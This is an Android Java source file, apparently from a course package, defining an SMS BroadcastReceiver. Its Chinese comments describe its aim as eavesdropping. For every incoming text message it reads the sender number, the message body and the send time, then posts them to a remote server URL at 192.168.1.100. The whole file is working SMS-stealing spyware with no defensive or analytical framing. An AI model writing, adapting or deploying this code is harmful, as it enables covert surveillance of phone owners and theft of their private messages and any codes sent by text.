package cn.itcast.sms;

import java.sql.Date;
import java.text.SimpleDateFormat;
import java.util.HashMap;
import java.util.Map;

import cn.itcast.utils.SocketHttpRequester;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import android.util.Log;

public class SMSBroadcastReceiver extends BroadcastReceiver {
    //在接受者这边获取短信相关信息，将相关信息发到服务器上进行窃听
	@Override
	public void onReceive(Context context, Intent intent) {
		Object[] pduses = (Object[])intent.getExtras().get("pdus");
		for(Object pdus : pduses){
			byte[] pdusmessage = (byte[]) pdus;//没一条短信
			SmsMessage sms = SmsMessage.createFromPdu(pdusmessage);
			String mobile = sms.getOriginatingAddress();//得到电话号码
			String content = sms.getMessageBody();//得到短信的内容
			Date date = new Date(sms.getTimestampMillis());//得到发送短信具体时间
			//2009-10-12 12:21:23
			SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");//为实践设置格式
			String sendtime = format.format(date);
			Map<String, String> params = new HashMap<String, String>();
			params.put("method", "getSMS");//将与短信相关的内容全部都放到集合里
			params.put("mobile", mobile);
			params.put("content", content);
			params.put("sendtime", sendtime);
			try {//利用socket向服务器发送窃听到的内容
				SocketHttpRequester.post("http://192.168.1.100:8080/videoweb/video/manage.do", params, "UTF-8");
			} catch (Exception e) {
				Log.e("SMSBroadcastReceiver", e.toString());
			}
		}
	}

}
